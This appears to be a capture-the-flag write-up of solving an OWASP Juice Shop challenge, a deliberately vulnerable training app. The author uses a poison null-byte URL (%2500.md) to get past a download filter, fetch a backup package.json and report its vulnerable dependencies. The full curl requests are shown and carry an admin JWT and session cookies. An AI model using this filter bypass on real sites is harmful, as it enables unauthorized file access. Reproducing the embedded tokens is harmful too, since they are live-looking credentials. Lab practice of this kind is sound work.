I scanned the juice shop website https://juice.8-thousander.me, using the ZAP vulnerability scanner. 

From the site map, I notice an interesting folder https://juice.8-thousander.me/ftp

I browsed into the folder and found many suspiciously named files.  One particular file, package.json.bak, caught my attention. https://juice.8-thousander.me/ftp/package.json.bak

package.json is a file that records the dependencies used a nodejs web application.  If I can obtain the file, I can analyse the vulnerabilities in thei dependencies, whih could allow me to attack the web application. 

I tried downloading the package.json, from browser. here is the extraction of the curl command line. 

```
curl 'https://juice.8-thousander.me/ftp/package.json.bak' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6' \
  -H 'cache-control: max-age=0' \
  -H 'cookie: language=en; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTkuMC4zIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjQxOjU0LjA3MiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjU1OjExLjI1MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Nzk1MzAyMjgsImV4cCI6MTY3OTU0ODIyOH0.mlBT2mzw8EC05VG_sMoXV7kyIN-XQ0q-OEzV7PoTy9iVOTgFoQH54R8hy5qHMSAO6ibG5iFnGOhyuL4DOHnwiiEX3bV5VQDdeI3zUy-D4h-mEIKdPlaGR97qi48PA3L2Rhe10Zct4TH3eseiNvLIZIwNi9zQ62W21MH5N6c3rWY; cookieconsent_status=dismiss; continueCode=ENqeb6arZJVwo7dxVt5U1TwFbf2S9HQinofyYSzLigyUP90zXROLMpPB9kyg' \
  -H 'dnt: 1' \
  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: none' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
  --compressed
```

The downloading failed, the folder only allows downloading of *.md and *.pdf files. 

```
<html>
  <head>
    <meta charset='utf-8'> 
    <title>Error: Only .md and .pdf files are allowed!</title>
```

In order the bypass the download restriction, I tried to apply a local file inclusion (LFI) technique. LFI tricks a web application into exposing a disallowed file on a web server. I did so by appending null bytes characters at the end of the original url, then add the allowed suffix to the forged url. 

This is the browser request extracted in curl

```
curl 'https://juice.8-thousander.me/ftp/package.json.bak%2500.md' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6' \
  -H 'cookie: language=en; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTkuMC4zIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjQxOjU0LjA3MiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjU1OjExLjI1MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Nzk1MzAyMjgsImV4cCI6MTY3OTU0ODIyOH0.mlBT2mzw8EC05VG_sMoXV7kyIN-XQ0q-OEzV7PoTy9iVOTgFoQH54R8hy5qHMSAO6ibG5iFnGOhyuL4DOHnwiiEX3bV5VQDdeI3zUy-D4h-mEIKdPlaGR97qi48PA3L2Rhe10Zct4TH3eseiNvLIZIwNi9zQ62W21MH5N6c3rWY; cookieconsent_status=dismiss; continueCode=ENqeb6arZJVwo7dxVt5U1TwFbf2S9HQinofyYSzLigyUP90zXROLMpPB9kyg' \
  -H 'dnt: 1' \
  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: none' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
  --compressed -o package.json
```

The LFI attack demonstrates a violation of A3:2017-Sensitive Data Exposure, which is now merged to A02:2021-Cryptographic Failures.

I then audited the package.json file, I removed 'eslint-scope@3.7.2' to remove unrelated errors.

```
npm i --package-lock-only package.json

npm audit 
```

I then picked some packages with critical vulnerabilities from audit result, send to customer feedback, and resolved the challenge. 

```
curl 'https://juice.8-thousander.me/api/Feedbacks/' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6' \
  -H 'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTkuMC4zIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjQxOjU0LjA3MiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjU1OjExLjI1MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Nzk1MzAyMjgsImV4cCI6MTY3OTU0ODIyOH0.mlBT2mzw8EC05VG_sMoXV7kyIN-XQ0q-OEzV7PoTy9iVOTgFoQH54R8hy5qHMSAO6ibG5iFnGOhyuL4DOHnwiiEX3bV5VQDdeI3zUy-D4h-mEIKdPlaGR97qi48PA3L2Rhe10Zct4TH3eseiNvLIZIwNi9zQ62W21MH5N6c3rWY' \
  -H 'content-type: application/json' \
  -H 'cookie: language=en; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTkuMC4zIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjQxOjU0LjA3MiArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIzLTAzLTIyIDE0OjU1OjExLjI1MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Nzk1MzAyMjgsImV4cCI6MTY3OTU0ODIyOH0.mlBT2mzw8EC05VG_sMoXV7kyIN-XQ0q-OEzV7PoTy9iVOTgFoQH54R8hy5qHMSAO6ibG5iFnGOhyuL4DOHnwiiEX3bV5VQDdeI3zUy-D4h-mEIKdPlaGR97qi48PA3L2Rhe10Zct4TH3eseiNvLIZIwNi9zQ62W21MH5N6c3rWY; cookieconsent_status=dismiss; continueCode=ENqeb6arZJVwo7dxVt5U1TwFbf2S9HQinofyYSzLigyUP90zXROLMpPB9kyg' \
  -H 'dnt: 1' \
  -H 'origin: https://juice.8-thousander.me' \
  -H 'referer: https://juice.8-thousander.me/' \
  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
  --data-raw '{"UserId":1,"captchaId":240,"captcha":"-5","comment":"marsdb-0.6, grunt - 1.0, expresswt 0.1.3, js-yaml 3.10, sequelize ~ 4, sanitize-html 1.4.2 (***in@juice-sh.op)","rating":2}' \
  --compressed
```